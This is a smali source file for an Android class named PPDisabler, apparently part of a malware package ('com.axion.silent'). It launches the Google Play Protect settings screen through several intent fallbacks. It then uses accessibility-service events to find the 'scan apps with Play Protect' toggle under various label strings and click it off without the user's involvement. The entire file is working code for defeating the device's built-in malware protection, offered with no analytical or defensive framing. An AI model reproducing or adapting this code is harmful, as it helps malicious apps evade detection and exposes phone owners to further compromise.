.class public Lcom/axion/silent/PPDisabler;
.super Ljava/lang/Object;

# Opens Play Protect settings directly.
# AutoPermService calls tryDisablePlayProtect() on each window event to find
# and flip the scan toggle when the PP settings screen is visible.
.method public static disable(Landroid/content/Context;)V
    .registers 4

    # Primary: direct GMS component (GMS 22.x+)
    :try_start_0
    new-instance v0, Landroid/content/Intent;
    invoke-direct {v0}, Landroid/content/Intent;-><init>()V
    const-string v1, "com.google.android.gms"
    const-string v2, "com.google.android.gms.security.settings.PlayProtectSettingsActivity"
    new-instance v3, Landroid/content/ComponentName;
    invoke-direct {v3, v1, v2}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-virtual {v0, v3}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :fallback1

    # Fallback 1: action-string intent (older GMS)
    :fallback1
    :try_start_1
    new-instance v0, Landroid/content/Intent;
    const-string v1, "com.google.android.gms.security.settings.action.LAUNCH_PLAY_PROTECT_SETTINGS"
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :fallback2

    # Fallback 2: generic security settings — AutoPermService will scroll-find the PP toggle
    :fallback2
    new-instance v0, Landroid/content/Intent;
    const-string v1, "android.settings.SECURITY_SETTINGS"
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    const v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    return-void
.end method

# Walk the active window tree looking for the Play Protect scan toggle and flip it off.
# Called from AutoPermService.onAccessibilityEvent on TYPE_WINDOW_STATE_CHANGED
# and TYPE_WINDOW_CONTENT_CHANGED while PP settings screen is open.
.method public static tryDisablePlayProtect(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .registers 5
    if-eqz p0, :done

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;
    move-result-object v0
    if-eqz v0, :check_desc
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    invoke-static {v0}, Lcom/axion/silent/PPDisabler;->isPPToggle(Ljava/lang/String;)Z
    move-result v1
    if-nez v1, :act

    :check_desc
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;
    move-result-object v0
    if-eqz v0, :recurse
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    invoke-static {v0}, Lcom/axion/silent/PPDisabler;->isPPToggle(Ljava/lang/String;)Z
    move-result v1
    if-eqz v1, :recurse

    :act
    # Only click if the toggle is currently ON (checked = true)
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z
    move-result v1
    if-eqz v1, :recurse
    const/16 v1, 0x10
    invoke-virtual {p0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    return-void

    :recurse
    const/4 v2, 0x0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I
    move-result v3
    :loop
    if-ge v2, v3, :done
    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v0
    if-eqz v0, :next
    invoke-static {v0}, Lcom/axion/silent/PPDisabler;->tryDisablePlayProtect(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :next
    add-int/lit8 v2, v2, 0x1
    goto :loop
    :done
    return-void
.end method

# Returns true when the label matches the Play Protect scan toggle across GMS versions and OEMs.
.method public static isPPToggle(Ljava/lang/String;)Z
    .registers 3
    const/4 v0, 0x1

    const-string v1, "scan apps with play protect"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "play protect"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "scan for harmful apps"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "app security"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "scan device for security threats"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "improve harmful app detection"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const/4 v0, 0x0
    :yes
    return v0
.end method
